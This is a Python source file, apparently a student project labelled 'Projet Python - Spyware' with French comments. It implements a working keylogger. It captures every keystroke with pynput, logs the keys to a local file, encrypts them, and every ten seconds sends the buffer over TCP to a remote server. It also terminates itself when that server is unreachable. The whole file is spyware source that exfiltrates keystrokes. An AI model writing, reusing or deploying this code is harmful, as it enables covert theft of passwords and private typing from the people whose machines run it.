from env import *

import argparse
import socket
import time
import threading
import os
import re
from pynput.keyboard import Listener
from chiffrement import *


TXT_GLOB = b""


def pav_num():
    touche = {

        "<96>": "0",
        "<97>": "1",
        "<98>": "2",
        "<99>": "3",
        "<100>": "4",
        "<101>": "5",
        "<102>": "6",
        "<103>": "7",
        "<104>": "8",
        "<105>": "9",
        "<110>": "."
    }
    return touche


def kill_all():
    pid = os.getpid()
    os.kill(pid, 9)


def parse(srt):
    pattern = r'<\d+>'
    new_str = srt.replace("'", "")
    new_str = new_str.replace("Key.space", " ")
    new_str = new_str.replace("Key.backspace", "<-")
    new_str = new_str.replace("Key.enter", "\n")
    new_str = new_str.replace("Key.shift_r", "")
    new_str = new_str.replace("Key.ctrl_l", "")
    new_str = new_str.replace("Key.alt_gr", "")
    if re.match(pattern, new_str):
        pav_num_str = pav_num()
        new_str = pav_num_str.get(new_str, "-1")
    return new_str


def kpr(key):
    global TXT_GLOB
    with open("keylog.txt", "a") as f:
        f.write(parse(str(key)))
        TXT_GLOB += chiffrement(parse(str(key)))


def scan_socket(port):
    try:
        rsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP

        rsocket.settimeout(0.5)  # définition du temps d'attente de la réponse

        if port:
            rsocket.connect((SRV, port))
        else:
            rsocket.connect((SRV, PORT))

        print("Toujours Co !!")
    except TimeoutError:
        print("Pas Co !!")
        kill_all()


def argument():
    p = argparse.ArgumentParser(description='Projet Python - Spyware')
    p.add_argument('-l', '--listen', type=int, help="se met en écoute sur le port TCP saisi par "
                                                    "l'utilisateur et attend les données du spyware UP")
    args = p.parse_args()
    return args


def chrono():
    arg = argument()
    global TXT_GLOB
    while True:
        seconds = 0
        while True:
            try:

                print(f"Secondes : {seconds}")
                seconds += 1
                scan_socket(arg.listen)
                time.sleep(1)

                if seconds % 10 == 0:
                    send_t = threading.Thread(target=send(TXT_GLOB, arg.listen))
                    send_t.start()
                    # print(TXT_GLOB)
                    TXT_GLOB = ""
                if seconds == 600:
                    return 0
            except:
                kill_all()


def keylogger():
    with Listener(on_press=kpr) as listener:
        listener.join()


def send(data, port):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        if port:
            client_socket.connect((SRV, port))
        else:
            client_socket.connect((SRV, PORT))

        client_socket.send(data.encode('utf-8'))  # envoi
        client_socket.close()
    except:
        kill_all()


def commands(cmd, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client_socket.connect((SRV, port))

    client_socket.send(cmd.encode('utf-8'))  # envoi

    client_socket.close()


chrono_t = threading.Thread(target=chrono)

chrono_t.start()

keylog_t = threading.Thread(target=keylogger)

keylog_t.start()
